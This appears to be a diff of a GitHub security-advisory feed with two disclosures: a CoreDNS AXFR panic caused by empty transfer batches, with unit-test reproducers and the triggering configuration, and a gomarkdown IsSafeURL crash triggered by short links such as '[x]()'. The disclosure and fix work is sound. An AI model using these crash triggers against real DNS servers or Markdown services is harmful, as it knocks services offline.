-<p><code>plugin/transfer/transfer.go</code> assumes that every <code>Transferer</code> emits only non-empty <code>[]dns.RR</code> batches. During AXFR/IXFR response generation it indexes <code>records[0]</code> without checking the slice length:</p>
-<ul>
-<li><code>plugin/transfer/transfer.go:129-131</code></li>
-</ul>
-<pre><code class="language-go">for records := range pchan {
-    if x, ok := records[0].(*dns.SOA); ok &amp;&amp; soa == nil {
-        soa = x
-    }
-</code></pre>
-<p>The built-in <code>k8s_external</code> transferer violates that contract for headless services whose endpoints have no declared ports. <code>plugin/k8s_external/transfer.go</code> sends the SRV result slice unconditionally:</p>
-<ul>
-<li><code>plugin/k8s_external/transfer.go:104-106</code></li>
-</ul>
-<pre><code class="language-go">recs, _ := e.srv(ctx, svcs, s)
-ch &lt;- recs
-</code></pre>
-<p><code>plugin/k8s_external/msg_to_dns.go</code> intentionally skips services whose port is <code>-1</code>:</p>
-<ul>
-<li><code>plugin/k8s_external/msg_to_dns.go:107-112</code></li>
-</ul>
-<pre><code class="language-go">for _, s := range services {
-    // Don't add the entry if the port is -1 (invalid). The kubernetes plugin uses port -1 when a service/endpoint
-    // does not have any declared ports.
-    if s.Port == -1 {
-        continue
-    }
-</code></pre>
-<p>The Kubernetes EndpointSlice conversion creates that sentinel when an EndpointSlice has no ports:</p>
-<ul>
-<li><code>plugin/kubernetes/object/endpoint.go:62-66</code></li>
-</ul>
-<pre><code class="language-go">if len(ends.Ports) == 0 {
-    // Add sentinel if there are no ports.
-    e.Subsets[0].Ports = []EndpointPort{{Port: -1}}
-</code></pre>
-<p>This creates a built-in source-to-sink chain:</p>
-<ol>
-<li>Kubernetes EndpointSlice has ready addresses and no ports.</li>
-<li>CoreDNS <code>kubernetes</code> converts it to an endpoint with <code>Port: -1</code>.</li>
-<li><code>k8s_external</code> with <code>headless</code> includes that service in transfer data.</li>
-<li><code>k8s_external.Transfer</code> sends an empty SRV <code>[]dns.RR</code> batch.</li>
-<li><code>transfer.ServeDNS</code> indexes <code>records[0]</code> and panics.</li>
-</ol>
-<p>Suggested remediation:</p>
-<ol>
-<li>In <code>plugin/transfer/transfer.go</code>, skip or reject empty <code>records</code> batches before indexing <code>records[0]</code>.</li>
-<li>In <code>plugin/k8s_external/transfer.go</code>, only send <code>recs</code> when <code>len(recs) &gt; 0</code> in the headless endpoint and port/protocol paths.</li>
-<li>Add regression tests covering <code>Port: -1</code> headless services and empty transfer batches.</li>
-</ol>
-<p>Example consumer-side guard:</p>
-<pre><code class="language-go">for records := range pchan {
-    if len(records) == 0 {
-        continue
-    }
-    if x, ok := records[0].(*dns.SOA); ok &amp;&amp; soa == nil {
-        soa = x
-    }
-    ...
-}
-</code></pre>
-<h3 id="poc">PoC</h3>
-<p>Safe local unit-level reproduction was performed. It does not contact external infrastructure and does not require a live Kubernetes cluster.</p>
-<h4 id="reproducer-a-the-transfer-sink-panics-on-an-empty-batch">Reproducer A: the <code>transfer</code> sink panics on an empty batch</h4>
-<p>A temporary package test was added under <code>plugin/transfer</code>:</p>
-<pre><code class="language-go">package transfer
-
-import (
-    "context"
-    "fmt"
-    "testing"
-
-    "github.com/coredns/coredns/plugin/pkg/dnstest"
-    "github.com/coredns/coredns/plugin/test"
-
-    "github.com/miekg/dns"
-)
-
-type auditEmptyBatchTransferer struct{}
-
-func (auditEmptyBatchTransferer) Transfer(zone string, serial uint32) (&lt;-chan []dns.RR, error) {
-    if zone != "example.org." {
-        return nil, ErrNotAuthoritative
-    }
-    ch := make(chan []dns.RR, 3)
-    ch &lt;- []dns.RR{test.SOA(fmt.Sprintf("%s 100 IN SOA ns.dns.%s hostmaster.%s %d 7200 1800 86400 100", zone, zone, zone, 1))}
-    ch &lt;- []dns.RR{}
-    close(ch)
-    return ch, nil
-}
-
-func TestAuditEmptyTransferBatchPanics(t *testing.T) {
-    tr := &amp;Transfer{
-        Transferers: []Transferer{auditEmptyBatchTransferer{}},
-        xfrs:        []*xfr{{Zones: []string{"example.org."}, to: []string{"*"}}},
-    }
-
-    req := new(dns.Msg)
-    req.SetQuestion("example.org.", dns.TypeAXFR)
-    rec := dnstest.NewRecorder(&amp;test.ResponseWriter{TCP: true})
-
-    defer func() {
-        if rec := recover(); rec == nil {
-            t.Fatal("expected empty transfer batch to panic")
-        }
-    }()
-
-    _, _ = tr.ServeDNS(context.Background(), rec, req)
-}
-</code></pre>
-<p>Verification command and result:</p>
-<pre><code class="language-text">$ go test ./plugin/transfer -run TestAuditEmptyTransferBatchPanics -count=1 -v
-=== RUN   TestAuditEmptyTransferBatchPanics
---- PASS: TestAuditEmptyTransferBatchPanics (0.00s)
-PASS
-ok  	github.com/coredns/coredns/plugin/transfer	0.005s
-</code></pre>
-<h4 id="reproducer-b-the-built-in-k8s_external-transferer-emits-the-empty-batch">Reproducer B: the built-in <code>k8s_external</code> transferer emits the empty batch</h4>
-<p>A temporary package test was added under <code>plugin/k8s_external</code>:</p>
-<pre><code class="language-go">package external
-
-import (
-    "testing"
-    "time"
-
-    "github.com/coredns/coredns/plugin/etcd/msg"
-    "github.com/coredns/coredns/plugin/kubernetes"
-    "github.com/coredns/coredns/request"
-
-    "github.com/miekg/dns"
-)
-
-func TestAuditHeadlessNoPortTransferEmitsEmptyBatch(t *testing.T) {
-    e := New()
-    e.Zones = []string{"example.com."}
-    e.headless = true
-    e.externalAddrFunc = func(request.Request, bool) []dns.RR { return nil }
-    e.externalSerialFunc = func(string) uint32 { return 1 }
-    e.externalServicesFunc = func(string, bool) ([]msg.Service, map[string][]msg.Service) {
-        return nil, map[string][]msg.Service{
-            "/coredns/com/example/testns/headless/" + kubernetes.Endpoint: {{Host: "192.0.2.10", Port: -1, TTL: 5, Key: "/coredns/com/example/testns/headless/endpoint-a"}},
-        }
-    }
-
-    ch, err := e.Transfer("example.com.", 0)
-    if err != nil {
-        t.Fatalf("Transfer returned error: %v", err)
-    }
-
-    deadline := time.After(time.Second)
-    for {
-        select {
-        case batch, ok := &lt;-ch:
-            if !ok {
-                t.Fatal("transfer closed before emitting an empty batch")
-            }
-            if len(batch) == 0 {
-                return
-            }
-        case &lt;-deadline:
-            t.Fatal("timed out waiting for an empty batch")
-        }
-    }
-}
-</code></pre>
-<p>Verification command and result:</p>
-<pre><code class="language-text">$ go test ./plugin/k8s_external -run TestAuditHeadlessNoPortTransferEmitsEmptyBatch -count=1 -v
-=== RUN   TestAuditHeadlessNoPortTransferEmitsEmptyBatch
---- PASS: TestAuditHeadlessNoPortTransferEmitsEmptyBatch (0.00s)
-PASS
-ok  	github.com/coredns/coredns/plugin/k8s_external	0.012s
-</code></pre>
-<p>Additional focused verification:</p>
-<pre><code class="language-text">$ go test ./plugin/transfer ./plugin/k8s_external ./plugin/kubernetes -run 'TestAudit|^$' -count=1 -v
-ok  	github.com/coredns/coredns/plugin/transfer	0.006s
-ok  	github.com/coredns/coredns/plugin/k8s_external	0.013s
-ok  	github.com/coredns/coredns/plugin/kubernetes	0.116s
-</code></pre>
-<p>Affected package suites:</p>
-<pre><code class="language-text">$ go test ./plugin/transfer ./plugin/k8s_external ./plugin/kubernetes -count=1
-ok  	github.com/coredns/coredns/plugin/transfer	0.010s
-ok  	github.com/coredns/coredns/plugin/k8s_external	0.011s
-ok  	github.com/coredns/coredns/plugin/kubernetes	0.194s
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>A network client allowed to request AXFR for the affected zone can trigger a panic in CoreDNS when all prerequisites are present.</p>
-<p>Required configuration/state:</p>
-<pre><code class="language-corefile">example.com:53 {
-    kubernetes cluster.local
-    k8s_external example.com {
-        headless
-    }
-    transfer example.com {
-        to *
-    }
-}
-</code></pre>
-<p>Additional prerequisite:</p>
-<ul>
-<li>The Kubernetes API state contains a headless-service endpoint represented by an EndpointSlice with ready addresses and no ports, producing CoreDNS <code>msg.Service{Port: -1}</code>.</li>
-</ul>
-<p>In normal CoreDNS mode, <code>core/dnsserver/server.go:267-279</code> recovers the panic and returns <code>SERVFAIL</code>, so this is a request-level availability issue and panic/log amplification issue. If the <code>debug</code> plugin is enabled, the server disables the recovery path and this can crash the CoreDNS process.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/coredns/coredns/security/advisories/GHSA-74w3-63xv-x9mv">https://github.com/coredns/coredns/security/advisories/GHSA-74w3-63xv-x9mv</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-62994">https://nvd.nist.gov/vuln/detail/CVE-2026-62994</a></li>
-<li><a href="https://github.com/coredns/coredns/pull/8207">https://github.com/coredns/coredns/pull/8207</a></li>
-<li><a href="https://github.com/coredns/coredns/commit/ab318db7b4a3a19273852ed627f54888198c8efb">https://github.com/coredns/coredns/commit/ab318db7b4a3a19273852ed627f54888198c8efb</a></li>
-<li><a href="https://github.com/coredns/coredns/releases/tag/v1.14.5">https://github.com/coredns/coredns/releases/tag/v1.14.5</a></li>
-<li><a href="https://github.com/advisories/GHSA-74w3-63xv-x9mv">https://github.com/advisories/GHSA-74w3-63xv-x9mv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-74w3-63xv-x9mv</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-10-16T19:26:42.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/gomarkdown/markdown] gomarkdown/markdown IsSafeURL panics on short URLs]]></title>
-        <id>https://github.com/advisories/GHSA-cv23-7vc5-jfh7</id>
-        <link href="https://github.com/advisories/GHSA-cv23-7vc5-jfh7"/>
-        <updated>2026-10-16T15:41:44.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>IsSafeURL slices url[:nPath] before checking that len(url) &gt;= nPath, so a URL shorter than a path prefix (0, 1 or 2 bytes) triggers a slice-bounds panic, and this is reached end to end when the html.Safelink hardening flag is enabled and the input contains an empty or very short link destination, giving an unrecoverable crash DoS. Confirmed at HEAD (e08cff8; present since 2022).</p>
-<h2 id="the-defect">The defect</h2>
-<p>parser/parser.go, IsSafeURL:</p>
-<pre><code class="language-go">func IsSafeURL(url []byte) bool {
-    nLink := len(url)
-    for _, path := range validPaths {          // "/", "./", "../"
-        nPath := len(path)
-        linkPrefix := url[:nPath]               // line 789: sliced BEFORE the length guard
-        if nLink &gt;= nPath &amp;&amp; bytes.Equal(linkPrefix, path) {   // line 790: guard is too late
-            ...
-</code></pre>
-<p>url[:nPath] is evaluated before the <code>nLink &gt;= nPath</code> check. When len(url) &lt; nPath and cap(url) &lt; nPath, the slice expression panics. Only the relative-path loop is affected; the adjacent URIs loop is already correctly guarded (the signal that this one deviates, the same signal as the anchor). Input: IsSafeURL("") panics ([:1] cap 0), IsSafeURL(".") panics ([:2] cap 1), IsSafeURL("..") panics ([:3] cap 2), while IsSafeURL("/") returns true. End to end: <code>markdown.ToHTML(input, html.CommonFlags|html.Safelink)</code> with input <code>[x]()</code> panics. Attacker model: (1) any service rendering untrusted Markdown with the html.Safelink flag (the URL-sanitizing hardening flag itself introduces the crash); or (2) any downstream that calls the exported parser.IsSafeURL on a 0/1/2-byte attacker URL, no flag required. No recover() anywhere, so an uncaught crash of the calling goroutine.</p>
-<h2 id="verification">Verification</h2>
-<p>EXECUTED with negative controls. Direct: the empty/1/2-char cases panic with the exact slice-bounds message while "/" returns true. End to end via ToHTML with html.CommonFlags|html.Safelink: <code>[x]()</code> panics, while <code>[x](/)</code>, <code>[x](http://example.com)</code>, plain text, and <code>[x](javascript:alert(1))</code> (safely dropped) do not. NOT verified: how many downstream apps enable Safelink or call IsSafeURL directly (the default no-Safelink render path does not reach it).</p>
-<h2 id="suggested-fix">Suggested fix</h2>
-<p>Move the slice inside the guard: check <code>nLink &gt;= nPath</code> first, then compute url[:nPath] (or use bytes.HasPrefix(url, path), which is length-safe). One-line change, mirroring the already-correct URIs loop.</p>
-<p>Also checked and sound: CVE-2026-40890 (smartypants smartLeftAngle OOB) is fixed; CVE-2024-44337 (list/paragraph infinite loop) is fixed (deep nesting capped at maxNesting=64); default XSS is by design (Safelink/SkipHTML not in CommonFlags).</p>
-<h2 id="tooling">Tooling</h2>
-<p>AI assistance was used while investigating. The panic is executed-verified with negative controls (IsSafeURL on empty/./.. panics with a slice-bounds error while "/" returns true; ToHTML with html.Safelink on <code>[x]()</code> panics while valid and javascript: links do not), and I confirmed at HEAD that IsSafeURL computes url[:nPath] before the <code>nLink &gt;= nPath</code> guard.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/gomarkdown/markdown/security/advisories/GHSA-cv23-7vc5-jfh7">https://github.com/gomarkdown/markdown/security/advisories/GHSA-cv23-7vc5-jfh7</a></li>
-<li><a href="https://github.com/gomarkdown/markdown/commit/61af6e1e69710c5ca13cfbaaaa1bc11bc763a8a9">https://github.com/gomarkdown/markdown/commit/61af6e1e69710c5ca13cfbaaaa1bc11bc763a8a9</a></li>
-<li><a href="https://github.com/advisories/GHSA-cv23-7vc5-jfh7">https://github.com/advisories/GHSA-cv23-7vc5-jfh7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cv23-7vc5-jfh7</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-16T15:41:39.000Z</published>
     </entry>
 </feed>
